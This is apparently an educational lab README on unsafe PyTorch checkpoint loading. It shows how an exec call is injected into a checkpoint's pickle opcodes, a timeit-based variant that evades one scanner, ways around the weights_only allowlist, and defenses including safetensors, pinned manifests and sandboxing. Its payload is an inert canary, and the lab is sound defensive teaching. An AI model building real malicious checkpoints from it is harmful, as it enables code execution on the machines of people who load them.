---
lab_id: LAB-01
title: "What torch.load really runs"
node: attack-unsafe-load                 # == folder name == articles/<node-id>.md basename
related_nodes: [defense-safe-load, defense-isolation, eval-asr, eval-threat-model, format-pytorch, format-safetensors, system-loader]
family: family-supply
access_profile: A13
level: beginner                          # beginner | intermediate | advanced
time: "60 min"
compose_profiles: [supply]               # services this lab needs, besides any backend profile
model_backend: none                      # none | optional | required
backends:                                # yes | partial | no | n/a
  container-ollama: n/a
  host-ollama: n/a
  external-api: n/a
hardware: "Any laptop, CPU only. 2 GB disk for the workbench image."
canary: ATLAS-CANARY-7f3a
last_tested: 2026-10-25
tested_on: "macOS 15.7.3 arm64 (M4 Max), OrbStack, Docker 29.8.2, Compose 5.5.0"
---

# LAB-01 · What torch.load really runs

> **Atlas node:** [Unsafe checkpoint deserialization](https://ai-security-atlas.github.io/?node=attack-unsafe-load) · **Family:** family-supply · **Level:** beginner · **Time:** 60 min · **Model backend:** none

## Overview

A PyTorch checkpoint (`.pt`, `.bin`) looks like data, but loading it runs a small program. The file is a ZIP archive whose `data.pkl` is a pickle: a list of opcodes that the unpickler executes to rebuild the tensors. Two of those opcodes, `GLOBAL` and `REDUCE`, can import and call any Python function. In this lab you hide the lab's inert canary payload inside an otherwise valid checkpoint, watch it run during `torch.load()` while the model keeps working, then measure what actually stops it: torch's allowlist loader, safetensors, scanners, pinned manifests and a sandbox. Source: [`labs/attack-unsafe-load`](https://github.com/ai-security-atlas/ai-security-atlas/tree/main/labs/attack-unsafe-load).

By the end you will be able to:

1. Read the pickle opcodes inside a `.pt` file and point to the two that turn loading into code execution.
2. Show that an unsafe load runs a payload before any inference while the model output stays identical.
3. Compare the defenses (the `weights_only` allowlist, safetensors, denylist scanners, a pinned manifest, a sandbox) and say what each one does not stop.

## Safety

> [!WARNING]
> **Local sandbox, educational use only.** These labs reproduce attack mechanisms so you can understand, measure and defend against them. Every step that generates or loads lab artifacts runs inside the provided containers, on your own machine, against models and files you created or downloaded for this lab. Never point a step at a system, model, account or API you are not authorized to test.
>
> **Payloads are harmless by design.** Every "successful attack" in these labs ends in a visible, inert signal: a fixed canary string (for example `ATLAS-CANARY-7f3a`) or a marker file in the lab's own `work/` folder. No payload reads your data, opens a network connection, spawns a process, persists, or produces harmful content. (Where a lab tests network isolation, the probe is separate harness code that targets only reserved, non-routable addresses.) Do not modify payloads.
>
> **External APIs:** with the external-API backend, your prompts and images (including the lab's test images) are sent to that endpoint. Prefer a server you run yourself. If you use a hosted provider, you are confirming that its terms allow security testing on your own account. Only steps tagged "external-api" use it, and each prints the endpoint before sending.

This lab deliberately runs untrusted code during model loading, first in the workbench (to show the default risk) and then in the sandbox. The payload only writes `work/canary-marker.txt` and prints the canary. Do not load `work/malicious.pt` or `work/variant.pt` outside the lab containers, do not install an old torch on your host to reproduce the pre-2.6 behavior, run `cleanup.py` when you finish, and never upload these files anywhere.

## Atlas Context

| Field | Value |
| :--- | :--- |
| Node | [`attack-unsafe-load`](../../articles/attack-unsafe-load.md) |
| Family | [`family-supply`](https://ai-security-atlas.github.io/?node=family-supply) |
| Goal | [`goal-environment`](https://ai-security-atlas.github.io/?node=goal-environment) |
| Access profile | `A13` Dependency or package distribution (caveat: *Victim must install, import or execute the affected artifact.*) |
| Read first | [`system-loader`](https://ai-security-atlas.github.io/?node=system-loader), [`format-pytorch`](https://ai-security-atlas.github.io/?node=format-pytorch) |
| Mitigated by | [`defense-safe-load`](https://ai-security-atlas.github.io/?node=defense-safe-load), [`defense-isolation`](https://ai-security-atlas.github.io/?node=defense-isolation) |
| Evaluated by | [`eval-asr`](https://ai-security-atlas.github.io/?node=eval-asr), [`eval-threat-model`](https://ai-security-atlas.github.io/?node=eval-threat-model) |
| Related | [`format-safetensors`](https://ai-security-atlas.github.io/?node=format-safetensors), [`attack-artifact-substitution`](https://ai-security-atlas.github.io/?node=attack-artifact-substitution), [`attack-dependency`](https://ai-security-atlas.github.io/?node=attack-dependency) |

> [!NOTE]
> **Atlas caveat:** Do not conflate parser/code-execution risk with a learned backdoor.

## Backend Support

Scripts always run in the workbench or sandbox service; the backend only answers model calls.

| Backend | Supported | Steps | Notes |
| :--- | :--- | :--- | :--- |
| container-ollama | n/a | — | No step calls a model endpoint. The attack runs code on the machine that loads the file. |
| host-ollama | n/a | — | Same: nothing in this lab is sent to a model. |
| external-api | n/a | — | A remote model API never loads your files, so it cannot be the victim here. |

## Hardware & Time

| Resource | Need |
| :--- | :--- |
| CPU | Any CPU; no GPU. Each step runs in seconds. |
| Docker VM memory | 4 GB |
| Disk | The workbench image (1.8 GB). The lab writes under 1 MB to `work/`. |
| Total time | 60 min: about 25 min of commands, the rest reading |

## Prerequisites

- "Start here" in the [labs index](../README.md) is done (the workbench image is built).
- Labs to finish first: none.
- Concepts to read first: [`format-pytorch`](https://ai-security-atlas.github.io/?node=format-pytorch) and [`system-loader`](https://ai-security-atlas.github.io/?node=system-loader).

## Explainer

```bash
# host
open attack-unsafe-load/explainer/index.html        # macOS
# xdg-open attack-unsafe-load/explainer/index.html  # Linux
```

The explainer step links in this README work only in a local clone; on GitHub they show HTML source. In 9 steps the explainer opens a checkpoint, plays the real opcode tape of `malicious.pt` through the pickle VM (stack, memo and imported callables) until `REDUCE` calls `exec`, then shows the allowlist gate, the safetensors layout and the sandbox, all with strings from a reference run of this lab.

## Setup

### Setup 1 — Profiles

Put the line for your backend in `labs/.env`:

| Backend | `COMPOSE_PROFILES` line |
| :--- | :--- |
| container-ollama | `COMPOSE_PROFILES=supply` |
| host-ollama | `COMPOSE_PROFILES=supply` |
| external-api | `COMPOSE_PROFILES=supply` |
| none | `COMPOSE_PROFILES=supply` |

This lab calls no model, so you can keep whichever backend block is active in `labs/.env`. The banner on every output prints that block's `LAB_BACKEND` (for example `backend container-ollama`); the Observe blocks below show `backend none`, which is what you see when no `LAB_BACKEND` line is active. Only the banner differs.

### Setup 2 — Build and start

**Do**

```bash
docker compose build workbench
docker compose up -d
```

**Observe**

```text
 Image atlas-labs/workbench:v1 Building
...
#14 [stage-0 6/8] RUN --mount=type=cache,target=/root/.cache/uv uv sync --frozen --no-install-project
#14 CACHED
...
 Image atlas-labs/workbench:v1 Built
...
 Container atlas-labs-workbench-1 Started
 Container atlas-labs-sandbox-1 Started
```

What to notice: the `supply` profile starts two idle containers from the same image: `workbench` (network on, checkout read-write) and `sandbox` (no network, read-only checkout).

### Setup 3 — Check the environment

**Do**

```bash
docker compose run --rm workbench python attack-unsafe-load/scripts/check_env.py
```

**Observe**

```text
[atlas-lab] attack-unsafe-load · check_env.py · torch 2.14.1+cpu · backend none
[ok] torch 2.14.1+cpu  safetensors 0.8.0  transformers 5.20.2
[ok] picklescan 1.0.5  modelscan 0.8.8  fickling 0.1.12  git 2.39.5
[ok] work dir: /labs/attack-unsafe-load/work (writable)
```

What to notice: the three scanners used in Step 7 and git (Step 8) come from the same image as torch.

## Walkthrough

| Step | Script | Service | Runtime | Explainer |
| :--- | :--- | :--- | :--- | :--- |
| 1 | s01_inspect_benign | workbench | <15 s | 1 |
| 2 | s02_craft_payload | workbench | <15 s | 3 |
| 3 | s03_victim_load (×2) + host check | workbench | <30 s | 4 |
| 4 | s03_victim_load | workbench | <15 s | 7 |
| 5 | s05_pitfalls | workbench | <15 s | 7 |
| 6 | s06_safetensors | workbench | <15 s | 8 |
| 7 | s07_scan | workbench | <30 s | — |
| 8 | s08_hub_setup, s08_hub_victim | workbench | <30 s | — |
| D1 | d1_verify_manifest (×2) | workbench | <30 s | — |
| D2 | cleanup --marker-only, d2_isolation_probe + host check | workbench, sandbox | <30 s | 9 |

Runtimes were measured on the test machine and include about 1–3 s of container start-up per `docker compose run` (warm image; the full verified run of every step, Setup to Cleanup, took about 80 s).

### Step 1 — Look before you load · [explainer 1](explainer/index.html#attack-unsafe-load/1)

**Do**

```bash
docker compose run --rm workbench python attack-unsafe-load/scripts/s01_inspect_benign.py
```

**Observe**

```text
[atlas-lab] attack-unsafe-load · s01_inspect_benign.py · torch 2.14.1+cpu · backend none
wrote work/benign.pt (2451 bytes); keys: ['0.weight', '0.bias', '2.weight', '2.bias']

ZIP entries:
  benign/data.pkl                      473 bytes
  benign/.format_version                 1 bytes
  benign/.storage_alignment              2 bytes
  benign/byteorder                       6 bytes
  benign/data/0                         48 bytes
  benign/data/1                         12 bytes
  benign/data/2                         24 bytes
  benign/data/3                          8 bytes
  benign/version                         2 bytes
  (hidden: .data/serialization_id, random per save)

pickletools.dis(benign/data.pkl):
    0: \x80 PROTO      2
    2: c    GLOBAL     'collections OrderedDict'
   27: q    BINPUT     0
   29: )    EMPTY_TUPLE
   30: R    REDUCE
   31: q    BINPUT     1
   33: (    MARK
   34: X        BINUNICODE '0.weight'
   47: q        BINPUT     2
   49: c        GLOBAL     'torch._utils _rebuild_tensor_v2'
...
  100: c                GLOBAL     'torch FloatStorage'
...
  471: b    BUILD
  472: .    STOP
highest protocol among opcodes = 2

GLOBAL imports: collections OrderedDict | torch._utils _rebuild_tensor_v2 | torch FloatStorage
```

What to notice: the weights are just bytes in `data/0..3`; everything else is a program in `data.pkl`, and its `GLOBAL` opcodes import three callables by name.

**Why**

A `.pt` file is a ZIP archive, and `data.pkl` is a pickle that `torch.load()` executes to rebuild the state dict ([`format-pytorch`](https://ai-security-atlas.github.io/?node=format-pytorch)). The loader is the component that turns "read a file" into "run what the file says" ([`system-loader`](https://ai-security-atlas.github.io/?node=system-loader)). Inspecting with `zipfile` and `pickletools` runs nothing.

### Step 2 — Craft the harmless payload · [explainer 3](explainer/index.html#attack-unsafe-load/3)

**Do**

```bash
docker compose run --rm workbench python attack-unsafe-load/scripts/s02_craft_payload.py
```

**Observe**

```text
[atlas-lab] attack-unsafe-load · s02_craft_payload.py · torch 2.14.1+cpu · backend none
wrote work/malicious.pt (2865 bytes); keys: ['0.weight', '0.bias', '2.weight', '2.bias']

GLOBAL imports: collections OrderedDict | torch._utils _rebuild_tensor_v2 | torch FloatStorage | __builtin__ exec

injected opcodes (the value of state_dict._metadata['__canary__']):
  BINUNICODE   '__canary__'
  BINPUT       50
  GLOBAL       '__builtin__ exec'
  BINPUT       51
  BINUNICODE   "import os, time\np = os.path.join(os.environ.get('ATLAS_WORK', '/labs...
  BINPUT       52
  TUPLE1
  BINPUT       53
  REDUCE

opcodes: benign.pt 178, malicious.pt 188 (+10)
```

What to notice: the keys and weights are unchanged; the pickle only gained 10 opcodes, a `GLOBAL '__builtin__ exec'`, the code string and a `REDUCE`.

**Why**

An object whose `__reduce__` returns `(exec, (code,))` tells pickle "to rebuild me, call `exec(code)`" ([`attack-unsafe-load`](https://ai-security-atlas.github.io/?node=attack-unsafe-load)). Hiding it in `state_dict._metadata`, which `load_state_dict()` never reads, keeps the model working, so nothing looks wrong ([`format-pytorch`](https://ai-security-atlas.github.io/?node=format-pytorch)). The code is the lab's fixed `labkit.INERT_CODE`, which only writes the marker file.

### Step 3 — The vulnerable load · [explainer 4](explainer/index.html#attack-unsafe-load/4)

> [!WARNING]
> This step deliberately loads the inert payload in the workbench, which has network access and can write your checkout, to show what an unsafe load does on a normal machine. Step D2 repeats it in the sandbox.

**Do**

```bash
docker compose run --rm workbench python attack-unsafe-load/scripts/s03_victim_load.py work/benign.pt unsafe
docker compose run --rm workbench python attack-unsafe-load/scripts/s03_victim_load.py work/malicious.pt unsafe
# host
cat attack-unsafe-load/work/canary-marker.txt
```

**Observe**

```text
[atlas-lab] attack-unsafe-load · s03_victim_load.py · torch 2.14.1+cpu · backend none
loading work/benign.pt with torch.load(weights_only=False)
load_state_dict OK -> tensor([[ 0.4794, -0.1188]])
marker exists: False
[atlas-lab] attack-unsafe-load · s03_victim_load.py · torch 2.14.1+cpu · backend none
loading work/malicious.pt with torch.load(weights_only=False)
[payload] ATLAS-CANARY-7f3a: code ran during torch.load -> wrote /labs/attack-unsafe-load/work/canary-marker.txt
load_state_dict OK -> tensor([[ 0.4794, -0.1188]])
marker exists: True
ATLAS-CANARY-7f3a pid=1 uid=1000 at=1792928294
```

What to notice: the `[payload]` line prints during `torch.load()`, before the model runs, and the model output is identical for both files.

**Why**

With `weights_only=False` the unpickler executes every opcode, including `GLOBAL` + `REDUCE`, with the permissions of whoever loads the file ([`attack-unsafe-load`](https://ai-security-atlas.github.io/?node=attack-unsafe-load)). The code ran before inference and the output did not change, so a victim has no visible signal. The marker landed in your checkout because the workbench mounts it read-write.

### Step 4 — The modern default blocks it · [explainer 7](explainer/index.html#attack-unsafe-load/7)

**Do**

```bash
docker compose run --rm workbench python attack-unsafe-load/scripts/s03_victim_load.py work/malicious.pt
```

**Observe**

```text
[atlas-lab] attack-unsafe-load · s03_victim_load.py · torch 2.14.1+cpu · backend none
loading work/malicious.pt with torch.load(weights_only=default -> True)
BLOCKED: UnpicklingError: Weights only load failed. This file can still be loaded, to do so you have two options, do those steps only if you trust the source of the checkpoint.
  (1) In PyTorch 2.6, we changed the default value of the `weights_only` argument in `torch.load` from `False` to `True`. Re-running `torch.load` with `weights_only` set to `False` will likely succeed, but it can result in arbitrary code execution. Do it only if you got the file from a trusted source.
  (2) Alternatively, to load with `weights_only=True` please check the recommended steps in the following error message.
  WeightsUnpickler error: Unsupported global: GLOBAL exec was not an allowed global by default. Please use `torch.serialization.add_safe_globals([exec])` or the `torch.serialization.safe_globals([exec])` context manager to allowlist this global if you trust this class/function.
  Check the documentation of torch.load to learn more about types accepted by default with weights_only https://pytorch.org/docs/stable/generated/torch.load.html.
marker exists: False
```

What to notice: the loader stops at `GLOBAL exec` and no marker is written, but option (1) of the error message tells you how to load it anyway.

**Why**

Since torch 2.6, `torch.load()` defaults to `weights_only=True`: an allowlist of the globals a plain state dict needs, so `exec` is rejected ([`defense-safe-load`](https://ai-security-atlas.github.io/?node=defense-safe-load)). On torch 2.5 and older the same call runs the payload and only prints a FutureWarning; this is described in text only, so do not install an old torch on your host to try it.

### Step 5 — Pitfalls that reopen the hole · [explainer 7](explainer/index.html#attack-unsafe-load/7)

**Do**

```bash
docker compose run --rm workbench python attack-unsafe-load/scripts/s05_pitfalls.py
```

**Observe**

```text
[atlas-lab] attack-unsafe-load · s05_pitfalls.py · torch 2.14.1+cpu · backend none

(A) inspect first: torch.serialization.get_unsafe_globals_in_checkpoint()
    benign    []
    malicious ['builtins.exec']
    -> payload did not fire

(B) follow the error's advice: with torch.serialization.safe_globals([exec])
[payload] ATLAS-CANARY-7f3a: code ran during torch.load -> wrote /labs/attack-unsafe-load/work/canary-marker.txt
    -> [payload] fired

(C) TORCH_FORCE_NO_WEIGHTS_ONLY_LOAD=1 set by a wrapper, then torch.load(f)
/labs/attack-unsafe-load/scripts/s05_pitfalls.py:46: UserWarning: Environment variable TORCH_FORCE_NO_WEIGHTS_ONLY_LOAD detected, since the`weights_only` argument was not explicitly passed to `torch.load`, forcing weights_only=False.
  torch.load(malicious)
[payload] ATLAS-CANARY-7f3a: code ran during torch.load -> wrote /labs/attack-unsafe-load/work/canary-marker.txt
    -> [payload] fired

(D) convert to safetensors with torch.load(f, weights_only=False)
[payload] ATLAS-CANARY-7f3a: code ran during torch.load -> wrote /labs/attack-unsafe-load/work/canary-marker.txt
    wrote work/converted.safetensors (the file is clean; the converter host was not)
    -> [payload] fired
```

What to notice: (A) finds `builtins.exec` without running anything, while (B), (C) and (D) each run the payload, and (B) is exactly what the Step 4 error suggests.

**Why**

An allowlist only protects you while it stays narrow: allowlisting `exec`, forcing the old default from a wrapper, or "converting to safetensors" with an unsafe load all execute the pickle ([`defense-safe-load`](https://ai-security-atlas.github.io/?node=defense-safe-load)). Convert untrusted files only inside a sandbox ([`defense-isolation`](https://ai-security-atlas.github.io/?node=defense-isolation)).

### Step 6 — safetensors has no VM · [explainer 8](explainer/index.html#attack-unsafe-load/8)

**Do**

```bash
docker compose run --rm workbench python attack-unsafe-load/scripts/s06_safetensors.py
```

**Observe**

```text
[atlas-lab] attack-unsafe-load · s06_safetensors.py · torch 2.14.1+cpu · backend none
work/model.safetensors: 404 bytes = 8 (header length) + header 304 + data 92
header: {"__metadata__":{"source":"benign.pt","format":"pt"},"0.bias":{"dtype":"F32","shape":[3],"data_offsets":[0,12]},"0.weight":{"dtype":"F32","shape":[3,4],"data_offsets":[12,60]},"2.bias":{"dtype":"F32","shape":[2],"data_offsets":[60,68]},"2.weight":{"dtype":"F32","shape":[2,3],"data_offsets":[68,92]}}
round-trip identical: True
store an object -> ValueError Key `evil` is invalid, expected torch.Tensor but received <class 'object'>
metadata returned as plain str: "print('ATLAS-CANARY-7f3a')" (never evaluated)
marker exists: False
```

What to notice: the file is a length, a JSON header and raw bytes; a non-tensor object cannot be stored, and metadata comes back as an inert string.

**Why**

[`format-safetensors`](https://ai-security-atlas.github.io/?node=format-safetensors) has no opcodes and no callable lookups, so a loader has nothing to execute ([`defense-safe-load`](https://ai-security-atlas.github.io/?node=defense-safe-load)). The conversion itself loaded the trusted `benign.pt` with `weights_only=True`; converting an untrusted pickle needs Step D2's sandbox.

### Step 7 — Scanners, and where they disagree

**Do**

```bash
docker compose run --rm workbench python attack-unsafe-load/scripts/s07_scan.py
```

**Observe**

```text
[atlas-lab] attack-unsafe-load · s07_scan.py · torch 2.14.1+cpu · backend none
wrote work/variant.pt (same payload body, called through timeit.timeit)

(exit codes in brackets; denylist scanners on the left, torch's allowlist on the right)
file               picklescan                     modelscan                fickling                       weights_only allowlist
benign.pt          clean (0)                      No issues found (0)      LIKELY_UNSAFE (1)              allowed   <- fickling false positive
malicious.pt       '__builtin__ exec' FOUND (1)   CRITICAL exec (1)        OVERTLY_MALICIOUS (1)          rejects builtins.exec
variant.pt         'timeit timeit' FOUND (1)      No issues found (0)      LIKELY_OVERTLY_MALICIOUS (1)   rejects time.perf_counter, timeit.timeit   <- modelscan 0.8.8 miss (known, public)
model.safetensors  not a pickle (0)               skipped (3)              n/a                            n/a (no pickle)

fickling scan/malicious/data.pkl (decompiled, cut):
  from __builtin__ import exec
  _var11 = exec("import os, time\np = os.path.join(os.environ.get('ATLAS_WORK', '/labs/attack-unsafe-load/work')...
```

What to notice: modelscan 0.8.8 reports `No issues found` for `variant.pt`, which carries the same payload through `timeit.timeit`, while torch's allowlist rejects every unexpected callable; fickling flags even the benign file.

**Why**

Denylist scanners only flag the callables on their list, so any code-reachable function they miss is a gap; allowlists ([`defense-safe-load`](https://ai-security-atlas.github.io/?node=defense-safe-load)) fail closed instead. The `timeit` gap is a known, publicly documented weakness, not a new finding: modelscan issue #272 (open since 2025-03-27) and #380, and the same gadget in picklescan, fixed in 0.0.25 (CVE-2025-71351); see Further Reading. Treat a clean scan as "nothing on the list was found", not as "safe" ([`eval-threat-model`](https://ai-security-atlas.github.io/?node=eval-threat-model)).

> [!NOTE]
> The variant exists to show why allowlists win. Do not add more evasion gadgets.

### Step 8 — Realistic delivery through a tampered hub

**Do**

```bash
docker compose run --rm workbench python attack-unsafe-load/scripts/s08_hub_setup.py
docker compose run --rm workbench python attack-unsafe-load/scripts/s08_hub_victim.py
```

**Observe**

```text
[atlas-lab] attack-unsafe-load · s08_hub_setup.py · torch 2.14.1+cpu · backend none
[ok] acme published ['config.json', 'model.safetensors'] to work/hub/acme/tiny-bert.git, tag v1.0
[ok] your team reviewed v1.0 and saved work/trusted-manifest.json

$ git log --oneline main   (SHAs differ on every run)
caef162 v1.1: switch to .bin for older runtimes
b0411ed publish tiny-bert v1.0

$ git diff --stat v1.0 main
 model.safetensors => pytorch_model.bin | Bin 102240 -> 112066 bytes
 1 file changed, 0 insertions(+), 0 deletions(-)
[atlas-lab] attack-unsafe-load · s08_hub_victim.py · torch 2.14.1+cpu · backend none
cloned main: caef162 v1.1: switch to .bin for older runtimes   files: ['config.json', 'pytorch_model.bin']

(1) AutoModelForSequenceClassification.from_pretrained(<clone of main>)
    BLOCKED: UnpicklingError: Weights only load failed. ...
    WeightsUnpickler error: Unsupported global: GLOBAL exec was not an allowed global by default. Please use `torch.serializ...
    marker exists: False

(2) resume_from_checkpoint(): torch.load(f, weights_only=False)
[payload] ATLAS-CANARY-7f3a: code ran during torch.load -> wrote /labs/attack-unsafe-load/work/canary-marker.txt
    load_state_dict: <All keys matched successfully>
    marker exists: True
```

What to notice: the attacker's commit looks like routine maintenance (a rename to `pytorch_model.bin`); `from_pretrained` is blocked by torch's default, but a hand-written resume helper with `weights_only=False` runs the payload. Your commit SHAs will differ.

**Why**

Whoever can push to the repo you pull from can replace a safe file with a pickle ([`attack-artifact-substitution`](https://ai-security-atlas.github.io/?node=attack-artifact-substitution)). The "hub" here is a local bare git repo under `work/hub/`; nothing touches a real hub. In transformers 5.20.2 `from_pretrained` loads `.bin` files with torch's `weights_only` default, so the realistic victim is old training code that calls `torch.load(..., weights_only=False)` directly.

## Defend

### Step D1 — Pin and verify

**Do**

```bash
docker compose run --rm workbench python attack-unsafe-load/scripts/d1_verify_manifest.py --revision main
docker compose run --rm workbench python attack-unsafe-load/scripts/d1_verify_manifest.py --revision v1.0
```

**Observe**

```text
[atlas-lab] attack-unsafe-load · d1_verify_manifest.py · torch 2.14.1+cpu · backend none
checked out main = caef162  (pinned manifest: work/trusted-manifest.json)
  ok       config.json          pinned ecf0181db5d0  got ecf0181db5d0
  MISMATCH model.safetensors    pinned 2dc498cd93e1  got -
  MISMATCH pytorch_model.bin    pinned -             got 83136afb12e9
REFUSING TO LOAD: files differ from the reviewed manifest

[atlas-lab] attack-unsafe-load · d1_verify_manifest.py · torch 2.14.1+cpu · backend none
checked out v1.0 = b0411ed  (pinned manifest: work/trusted-manifest.json)
  ok       config.json          pinned ecf0181db5d0  got ecf0181db5d0
  ok       model.safetensors    pinned 2dc498cd93e1  got 2dc498cd93e1
VERIFIED: every file matches the reviewed manifest
loaded BertForSequenceClassification from model.safetensors
```

What to notice: `main` fails the pinned manifest and exits 1 before anything is loaded (the empty line after `REFUSING TO LOAD` is printed by `docker compose run` for a non-zero exit); the reviewed tag `v1.0` verifies and loads from `model.safetensors`.

**Why**

Pinning a reviewed revision and checking file hashes before loading stops silent substitution ([`defense-safe-load`](https://ai-security-atlas.github.io/?node=defense-safe-load), related: [`defense-provenance`](https://ai-security-atlas.github.io/?node=defense-provenance)). Limitation: a pinned hash only proves you got what was pinned, not that the pinned file is safe.

### Step D2 — Isolate the loader · [explainer 9](explainer/index.html#attack-unsafe-load/9)

**Do**

```bash
docker compose run --rm workbench python attack-unsafe-load/scripts/cleanup.py --marker-only
docker compose run --rm sandbox python attack-unsafe-load/scripts/d2_isolation_probe.py work/malicious.pt
# host
test -e attack-unsafe-load/work/canary-marker.txt && echo "host marker: present" || echo "host marker: absent"
```

**Observe**

```text
[atlas-lab] attack-unsafe-load · cleanup.py · torch 2.14.1+cpu · backend none
[ok] removed attack-unsafe-load/work/canary-marker.txt
[atlas-lab] attack-unsafe-load · d2_isolation_probe.py · torch 2.14.1+cpu · backend none
loading work/malicious.pt with torch.load(weights_only=False)
[payload] ATLAS-CANARY-7f3a: code ran during torch.load -> wrote /work/canary-marker.txt
marker in sandbox: True (/work/canary-marker.txt)
dns canary.invalid: gaierror (no network): [Errno -3] Temporary failure in name resolution
egress 192.0.2.1:9: OSError Network is unreachable
write to /labs: OSError Read-only file system
host marker: absent
```

What to notice: the payload still ran, but it could only write the sandbox's throwaway `/work`; DNS, egress and writes to the checkout all failed, and the host marker is absent.

**Why**

The `sandbox` service has no network, a read-only root and checkout, no capabilities and a tmpfs `/work` that vanishes with `--rm` ([`defense-isolation`](https://ai-security-atlas.github.io/?node=defense-isolation)). The probes are separate harness code that runs after the load and targets only reserved addresses (`canary.invalid`, TEST-NET-1 `192.0.2.1`). Limitation: isolation contains the code; it does not stop it from running.

## Evaluate

**Do**

```bash
docker compose run --rm workbench python attack-unsafe-load/scripts/evaluate.py
```

**Observe**

```text
[atlas-lab] attack-unsafe-load · evaluate.py · torch 2.14.1+cpu · backend none
condition                                    malicious.pt  variant.pt  executed  ASR
torch.load(weights_only=False)               ran           ran         2/2       100%
torch.load() default (weights_only)          blocked       blocked     0/2       0%
safe_globals([exec]) misuse                  ran           blocked     1/2       50%
fickling safe-ML hook + weights_only=False   blocked       blocked     0/2       0%
(sandbox: see Step D2; the payload runs, the host work/ folder stays untouched)
RESULT: REPRODUCED
```

`RESULT` says only whether the run matches the published shape in `expected/`; the table is the security verdict. Each row is a fresh Python process per file, and "ran" means the canary marker appeared.

Questions for your notes:

1. Which conditions are allowlists, and which are denylists? Why does `safe_globals([exec])` block `variant.pt` but not `malicious.pt`?
2. In D2 the payload still executed. Why does that still count as a defense ([`eval-asr`](https://ai-security-atlas.github.io/?node=eval-asr))?
3. Map each row to [`eval-threat-model`](https://ai-security-atlas.github.io/?node=eval-threat-model): who controls the file, the loader code and the environment?

## Cleanup

**Do**

```bash
docker compose run --rm workbench python attack-unsafe-load/scripts/cleanup.py
docker compose down --remove-orphans
```

**Observe**

```text
[atlas-lab] attack-unsafe-load · cleanup.py · torch 2.14.1+cpu · backend none
[ok] removed attack-unsafe-load/work (attacker/ benign.pt converted.safetensors hub/ malicious.pt model.safetensors note.safetensors publisher/ scan/ trusted-manifest.json variant.pt verify/ victim/)
 Container atlas-labs-sandbox-1 Removed
 Container atlas-labs-workbench-1 Removed
 Network atlas-labs_default Removed
```

> [!NOTE]
> `docker compose down -v` also drops the named volumes (HF cache, Ollama models, Open WebUI data). Host-Ollama models are removed with `ollama rm <model>`.

## Going Further

- Write a CI check that fails when `torch.serialization.get_unsafe_globals_in_checkpoint()` returns anything for a file in a model directory; test it on `benign.pt`, `malicious.pt` and `variant.pt`.
- Write an allowlist-based loader wrapper for this MLP and show which of the three files it accepts.
- Design a pre-load policy for `trust_remote_code` (for example: refuse unless the repo revision is pinned and reviewed) and test it against the local hub fixture from Step 8.
- Inspect a real GGUF header with the `gguf` package in the workbench and list what a loader trusts in it.

## Further Reading

- PyTorch, [`torch.load` documentation and security warning](https://docs.pytorch.org/docs/main/generated/torch.load.html) (seed source `s-torchload`), and the [serialization notes on `weights_only`](https://docs.pytorch.org/docs/main/notes/serialization.html).
- Hugging Face, [Safetensors documentation](https://huggingface.co/docs/safetensors/index) (seed source `s-safetensors`).
- Python, [`pickle`](https://docs.python.org/3/library/pickle.html) and [`pickletools`](https://docs.python.org/3/library/pickletools.html) documentation.
- Scanners: [picklescan](https://github.com/mmaitre314/picklescan), [modelscan](https://github.com/protectai/modelscan), [fickling](https://github.com/trailofbits/fickling).
- The public `timeit` gap used in Step 7: modelscan [issue #272](https://github.com/protectai/modelscan/issues/272) (open since 2025-03-27), [issue #380](https://github.com/protectai/modelscan/issues/380) (45 code-reachable stdlib callables not flagged in 0.8.8), open fix PRs [#377](https://github.com/protectai/modelscan/pull/377) and [#381](https://github.com/protectai/modelscan/pull/381); the same gadget in picklescan, [GHSA-v7x6-rv5q-mhwc / CVE-2025-71351](https://github.com/advisories/GHSA-v7x6-rv5q-mhwc), fixed in picklescan 0.0.25.

---

[All labs](../README.md) · [next →](../attack-visual-jailbreak/README.md)
